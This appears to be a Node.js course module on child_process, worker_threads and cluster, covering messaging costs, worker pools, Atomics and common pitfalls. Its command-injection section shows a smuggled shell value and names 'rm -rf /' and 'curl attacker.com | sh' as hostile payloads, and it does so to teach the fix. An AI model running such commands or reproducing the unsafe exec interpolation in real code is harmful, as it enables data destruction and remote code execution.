# 08 — Child Processes, Worker Threads & Cluster

Modules 02 and 05 kept saying "move that off the main thread." This is where you do it.

Node gives you three mechanisms, and choosing wrong is the usual mistake — people reach for `cluster` when they need a worker pool, or spawn a process per request when a thread would do.

---

## 1. Choosing

| | `child_process` | `worker_threads` | `cluster` |
|---|---|---|---|
| Unit | a separate **process** | a **thread** in your process | forked **processes** sharing a port |
| Runs | any program | JavaScript only | your own app, N times |
| Memory | fully isolated | isolated heaps, **can share** `SharedArrayBuffer` | fully isolated |
| Startup | ~20–30ms | ~20–25ms | ~30ms |
| Communication | pipes / JSON IPC | `postMessage` (structured clone, transfer, or shared) | JSON IPC |
| Crash blast radius | just that process | **takes down the whole process** | just that worker |
| Use for | running `ffmpeg`, `git`, a Python script | CPU-bound **JS**: parsing, hashing, image work | scaling one HTTP server across cores |

The decision tree:

```
Is it an external program?              → child_process (spawn / execFile)
Is it CPU-bound JavaScript?             → worker_threads (in a POOL)
Do you need N copies of an HTTP server? → cluster… or just run N containers
Is it I/O-bound?                        → none of these. You already have async I/O.
```

That last line matters most. Workers do **not** make I/O faster — network I/O is already non-blocking (module 02 §5). Adding a worker to "speed up" a database call makes it slower.

---

## 2. `child_process`

Four functions, and the differences are important.

```ts
import { spawn, exec, execFile, fork } from "node:child_process";
```

| Function | Shell? | Output | Use when |
|---|---|---|---|
| `spawn` | no | **streams** | long-running, large or streaming output |
| `execFile` | no | buffered, in a callback | short output, you want it as a string |
| `exec` | **yes** | buffered | you genuinely need shell features (pipes, globs) |
| `fork` | no | streams + **IPC channel** | spawning another Node script you control |

### 2.1 `exec` runs a shell — that's a command-injection hole

```ts
const userInput = "hello; echo INJECTED";

await execFileAsync("echo", [userInput]);
// stdout: "hello; echo INJECTED"        ← the argument stayed an argument ✓

await execAsync(`echo ${userInput}`);
// stdout: "hello\nINJECTED"             ← the shell ran a second command ✗
```

Replace `echo INJECTED` with `rm -rf /` or `curl attacker.com | sh` and you have the whole vulnerability class.

**Rule: never interpolate user input into `exec`.** Use `spawn`/`execFile` with an argument array — no shell, no parsing, no injection. If you truly need a pipeline, build it with two `spawn`s connected by streams.

### 2.2 `spawn` for anything with real output

```ts
const child = spawn("ffmpeg", ["-i", input, "-f", "mp4", "pipe:1"], {
  stdio: ["ignore", "pipe", "pipe"],
});

await pipeline(child.stdout, createWriteStream(output));
```

`exec`/`execFile` buffer everything in memory and fail with `ERR_CHILD_PROCESS_STDIO_MAXBUFFER` past `maxBuffer` (1MB by default). `spawn` gives you streams, so it works on a 4GB video.

### 2.3 Exit codes and signals

```ts
child.on("exit", (code, signal) => {
  // Exactly ONE of these is non-null:
  //   code: 3,      signal: null      → exited normally with status 3
  //   code: null,   signal: "SIGTERM" → killed by a signal
});
```

Forgetting the signal case is how "the job succeeded" gets logged for a process the OOM killer shot.

```ts
child.on("error", (err) => { /* the process could not be SPAWNED at all */ });
```

`error` (ENOENT — binary not found) and `exit` are different failures. Handle both.

### 2.4 `fork` gives you an IPC channel

```ts
// parent
const child = fork("./worker-script.ts");
child.send({ job: 1 });
child.on("message", (msg) => console.log(msg));

// child
process.on("message", (msg) => process.send!({ done: msg }));
```

Messages are **JSON-serialised**, so no `Date`, `Map`, `Buffer`, or cycles — unlike `worker_threads`, which uses structured clone. If you're forking Node to run JS, a worker thread is almost always the better tool.

### 2.5 Always kill your children

```ts
const child = spawn(cmd, args);
const ac = new AbortController();

try {
  await once(child, "exit");
} finally {
  child.kill("SIGTERM");
  setTimeout(() => child.kill("SIGKILL"), 5_000).unref();   // escalate
}
```

A child outlives its parent by default. `spawn(cmd, args, { signal })` wires an `AbortSignal` up for you.

---

## 3. `worker_threads`

```ts
// main.ts
import { Worker } from "node:worker_threads";

const worker = new Worker(new URL("./worker.ts", import.meta.url), {
  workerData: { seed: 7 },
});

worker.on("message", (msg) => console.log(msg));
worker.on("error", (err) => console.error(err));      // uncaught throw inside
worker.on("exit", (code) => console.log("exited", code));

worker.postMessage({ n: 21 });
```

```ts
// worker.ts
import { parentPort, workerData, threadId } from "node:worker_threads";

parentPort!.on("message", (msg: { n: number }) => {
  parentPort!.postMessage({ result: msg.n * 2, threadId });
});
```

Native TypeScript stripping applies to workers too — `new Worker("./worker.ts")` just works on Node 22.18+.

### 3.1 What a worker does and doesn't share

**Shared:** the process, its file descriptors, `SharedArrayBuffer`s you pass explicitly.

**Not shared:** the V8 heap, globals, module registry, `AsyncLocalStorage` context. A worker re-imports every module from scratch — so import-time side effects (module 01 §3.3) run again, per worker.

```ts
worker.threadId;      // 1, 2, 3…
isMainThread;         // false inside a worker
availableParallelism();  // how many workers make sense
```

### 3.2 Errors and lifecycle

```ts
worker.on("error", handler);   // an uncaught throw INSIDE the worker
worker.on("exit", (code) => {}); // 0 = clean, 1 = terminate(), other = process.exit(n)
await worker.terminate();      // returns a promise; the worker is killed, not asked
```

An unhandled error in a worker does **not** crash the main thread — it surfaces as an `error` event. But `terminate()` is abrupt: pending work is lost, `finally` blocks do not run. For a clean stop, message the worker and let it exit itself.

### 3.3 Message costs — this is the whole design question

Measured, 32MB payload:

| Mechanism | Time | Source afterwards |
|---|---|---|
| structured clone (default) | **39.6ms** | still usable |
| `transferList` (zero-copy) | **5.1ms** | **detached** (`byteLength` 0) |
| `SharedArrayBuffer` | **0.3ms** | still usable, shared |

```ts
// 1. Clone — simple, and copies everything
worker.postMessage({ buf: arrayBuffer });

// 2. Transfer — ownership moves; the sender's buffer is DETACHED
worker.postMessage({ buf: arrayBuffer }, [arrayBuffer]);
arrayBuffer.byteLength;   // 0 — you may not touch it again

// 3. Share — both sides see the same memory, no message needed after setup
const sab = new SharedArrayBuffer(size);
worker.postMessage({ buf: sab });
```

Structured clone handles `Map`, `Set`, `Date`, `RegExp`, `Error`, `TypedArray`, and cycles — but **not** functions, class identity, or DOM-style objects. It's a deep copy, so a 32MB payload costs 32MB of allocation on both sides.

If you're passing big buffers back and forth, the clone cost can exceed the work you moved off-thread. Measure before assuming a worker helped.

### 3.4 `Atomics` for coordination

`SharedArrayBuffer` gives you shared memory with no locks, so you need `Atomics` for anything read-modify-write:

```ts
const counter = new Int32Array(new SharedArrayBuffer(4));

Atomics.add(counter, 0, 1);       // atomic increment
Atomics.load(counter, 0);         // atomic read
Atomics.store(counter, 0, 5);
Atomics.compareExchange(counter, 0, expected, next);

Atomics.wait(counter, 0, 0);      // BLOCK this thread until the value changes
Atomics.notify(counter, 0, 1);    // wake one waiter
```

⚠ `Atomics.wait` **blocks the thread**, event loop and all. Never call it on the main thread of a server — that's every problem from module 02 at once. It's for a worker deliberately parking until there's work.

---

## 4. Worker pools

A `new Worker()` per task costs ~25ms of startup and a fresh V8 heap. For anything smaller than a few hundred milliseconds of work, that dominates.

**Always pool.** The shape:

```ts
class WorkerPool {
  #idle: Worker[] = [];
  #queue: Task[] = [];

  async run(payload) {
    const worker = this.#idle.pop() ?? (await this.#waitForIdle());
    // …send, await the reply, return the worker to #idle…
  }
}
```

The details that make it production-ready — timeouts, a worker that dies mid-task, backpressure on the queue, graceful shutdown — are what you build in the exercise.

Sizing: `availableParallelism()` is the ceiling for CPU-bound work. More workers than cores just adds context switching. Leave one core for the main thread if it's also serving traffic.

Or use `piscina`, which is this done properly. Writing one first tells you what it's doing.

---

## 5. `cluster`

```ts
import cluster from "node:cluster";
import { availableParallelism } from "node:os";

if (cluster.isPrimary) {
  for (let i = 0; i < availableParallelism(); i++) cluster.fork();
  cluster.on("exit", (worker, code, signal) => {
    logger.warn({ pid: worker.process.pid, code, signal }, "worker died, restarting");
    cluster.fork();
  });
} else {
  createServer(handler).listen(3000);   // every worker "listens" on the same port
}
```

The primary creates the listening socket and distributes connections; workers inherit it. That's why N processes can bind one port.

### 5.1 When cluster is the wrong answer

In 2026, if you deploy in containers, **you probably want N containers instead of N cluster workers**:

- The orchestrator already does restarts, health checks, and rolling deploys — cluster reimplements them worse.
- Per-container CPU limits interact badly with `availableParallelism()`, which reports the **host's** cores, not your cgroup limit. A 1-CPU container forking 64 workers is a classic production mistake.
- Debugging, profiling, and log correlation are all simpler with one process per container.

Cluster still earns its place for a single VM or bare metal, or a CLI serving locally.

⚠ **Cluster does not fix a blocked event loop.** If one request blocks for 500ms, it blocks *that worker* for 500ms and every request routed to it. Workers give you more loops, not faster ones. For CPU-bound work you still need worker threads.

---

## 6. Overheads, measured

From `06-comparison.ts` (numbers vary by machine):

| | Startup | Message round trip |
|---|---|---|
| worker thread | ~25ms | ~0.1ms small, 39ms for 32MB cloned |
| child process | ~23ms | ~0.5ms small (JSON over a pipe) |
| function call | 0 | 0 |

The lesson: **both are expensive to create and cheap to reuse.** Pool them. And if the task takes less than a few milliseconds, doing it inline is faster than any of this.

---

## 7. Pitfalls

- **Workers don't help I/O.** Async I/O is already parallel. A worker adds latency.
- **Clone cost can exceed the work.** Sending 50MB to save 20ms of CPU is a net loss.
- **`AsyncLocalStorage` does not cross a worker boundary** (module 07 §6). Pass the request id in the message explicitly.
- **Import-time side effects run per worker.** A module that opens a DB connection at import (module 01 §3.3) opens one *per worker*.
- **`terminate()` is not graceful.** No `finally`, no flush. Message the worker to stop.
- **A worker that throws at startup** emits `error` and then `exit` — handle both, or your pool leaks a slot.
- **`availableParallelism()` reports host cores, not your cgroup limit.** In a container, read the limit or make it configurable.
- **Unref'd workers still keep the process alive** unless you `unref()` them — a forgotten pool is why your CLI won't exit.

---

## 8. Files in this module

| File | What it demonstrates |
|---|---|
| `01-child-process.ts` | spawn/exec/execFile/fork, **shell injection**, streams, exit codes vs signals |
| `02-worker-basics.ts` | creating workers, `workerData`, messaging, errors, lifecycle, isolation |
| `03-messaging.ts` | clone vs transfer vs `SharedArrayBuffer`, measured; `Atomics` |
| `04-worker-pool.ts` | why pooling matters, measured against per-task workers and inline |
| `05-cluster.ts` | forking a server across cores; when to use containers instead |
| `06-comparison.ts` | startup and round-trip costs side by side |
| `exercise.ts` | build a production `WorkerPool` with timeouts, retries and shutdown |

```bash
node src/08-processes-workers/index.ts
node scripts/test.ts 08
node scripts/test.ts --solutions 08
```

---

## 9. Check yourself

1. `exec(\`convert ${userFile} out.png\`)` — what's the vulnerability, and what's the fix?
2. A child exits with `code: null, signal: "SIGKILL"`. What happened, and did the job succeed?
3. You move a JSON parse of a 50MB payload into a worker and it gets slower. Why?
4. What does `arrayBuffer.byteLength` return after you pass it in a `transferList`?
5. Why must you never call `Atomics.wait` on the main thread of a server?
6. Your worker pool serves a request-scoped `requestId` from `AsyncLocalStorage` and gets `undefined`. Why?
7. You run `cluster.fork()` per `availableParallelism()` inside a 1-CPU container. What goes wrong?
8. One route takes 800ms of CPU. Does `cluster` fix your p99?
